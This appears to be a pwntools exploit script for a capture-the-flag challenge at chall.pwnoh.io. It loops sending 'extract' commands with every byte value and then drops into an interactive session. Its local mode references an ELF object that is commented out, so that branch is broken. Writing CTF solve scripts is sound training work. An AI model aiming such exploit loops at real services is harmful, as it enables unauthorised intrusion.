#!/usr/bin/python3

from pwn import *

# exe = ELF('a', checksec=False)

# context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('chall.pwnoh.io', 13379)
else:
        p = process(exe.path)

GDB()
for i in range(0, 0xff):
        sla(b'/exit]', b'extract')
        sla(b'extract:', p8(i))
p.interactive()
